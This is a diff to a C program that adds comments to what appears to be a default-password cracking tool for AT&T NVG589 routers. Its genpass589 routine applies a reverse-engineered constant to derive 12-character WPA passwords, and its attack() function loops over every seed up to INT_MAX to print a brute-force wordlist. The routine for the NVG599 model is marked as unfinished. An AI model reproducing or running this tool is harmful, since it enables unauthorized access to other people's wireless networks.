@@ -31,18 +31,22 @@
 int DONE = 0;
 char TARGET[9];
 char MODE[4];
+/**
+ * Serial and mac address are for future keygens
+ * (and once I actually know C :P)
+ */
 //char SERIAL[];
 //char MADDR[];
 
+/**
+ * Just some command line arguments using getopt
+ */
 static const char *option_string = "t:w:s:m:h";
-static const struct option long_options[] = {
-		{ "target", required_argument, 0, 't' },
-		{ "mode", required_argument, 0, 'w' },
-		{ "serial", required_argument, 0, 's' },
-		{ "maddr", required_argument, 0, 'm'},
-		{ "help", no_argument, 0, 0 },
-		{ 0, no_argument, 0, 'h' },
-		{ 0, 0, 0, 0 } };
+static const struct option long_options[] = { { "target", required_argument, 0,
+		't' }, { "mode", required_argument, 0, 'w' }, { "serial",
+		required_argument, 0, 's' }, { "maddr",
+required_argument, 0, 'm' }, { "help", no_argument, 0, 0 }, { 0,
+no_argument, 0, 'h' }, { 0, 0, 0, 0 } };
 
 void usage_err() {
 	fprintf(stderr, usage, SHORT_VERSION);
@@ -53,12 +57,19 @@ void usage_err_verbose() {
 	exit(0);
 }
 
+// nvg589 password algorithm, about 80% accurate
 void genpass589(unsigned x, unsigned char *buf) {
 	static const char CHARSET[] = "abcdefghijkmnpqrstuvwxyz23456789#%+=?";
-	long double x1 = x * 465661287.5245797;
+	long double x1 = x * 465661287.5245797; // thank you mrfancypants for finding this number
 	long long x2 = x1;
 	int i;
-	buf[12] = 0;
+	buf[12] = 0; // create buffer for password
+
+	/**
+	 * This code finds the associated ascii value in the charset specified above
+	 * If we knew the seed they were using, we wouldn't have to bruteforce every
+	 * possibility
+	 */
 	for (i = 0; i < 6; i++) {
 		int k1 = CHARSET[x2 % 37];
 		x2 /= 37;
@@ -69,6 +80,7 @@ void genpass589(unsigned x, unsigned char *buf) {
 	}
 }
 
+// nvg599 password algorithm, not finished
 void genpass599(unsigned y, unsigned char *buf) {
 	// static const char CHARSET[] = "abcdefghijkmnpqrstuvwxyz23456789#%+=?";
 	// long double x1 = y;
@@ -76,8 +88,14 @@ void genpass599(unsigned y, unsigned char *buf) {
 	printf("Not functioning yet");
 }
 
+/**
+ *  This probably isn't optimal coding technique but it works
+ *  Just some simple configuration vectors
+ *  Thanks for understanding
+ */
+
 void attack() {
-	unsigned char pw[13];
+	unsigned char pw[13]; // set size of password (12)
 	if (((strcmp("nvg589", TARGET)) == 0) && ((strcmp("wpa", MODE)) == 0)) {
 		for (unsigned k = 0; k <= INT_MAX; k++) {
 			genpass589(k, pw);
@@ -89,7 +107,7 @@ void attack() {
 		 genpass599(0, pw);
 		 printf("%s\n", pw);
 		 }
-		 **/
+		 */
 	} else {
 		usage_err();
 	}
@@ -103,7 +121,7 @@ int main(int argc, char **argv) {
 	while (opt != -1) {
 		switch (opt) {
 
-		case 't':
+		case 't': // target model number selection
 			if ((strcmp("nvg589", optarg)) == 0) {
 				strcpy(TARGET, optarg);
 
@@ -116,7 +134,7 @@ int main(int argc, char **argv) {
 				usage_err();
 			break;
 
-		case 'w':
+		case 'w': // security mode selection
 			if ((strcmp("wpa", optarg)) == 0) {
 				strcpy(MODE, optarg);
 
@@ -126,7 +144,7 @@ int main(int argc, char **argv) {
 				usage_err();
 			break;
 
-		case 'h':
+		case 'h': // display verbose help
 			usage_err_verbose();
 			break;
 
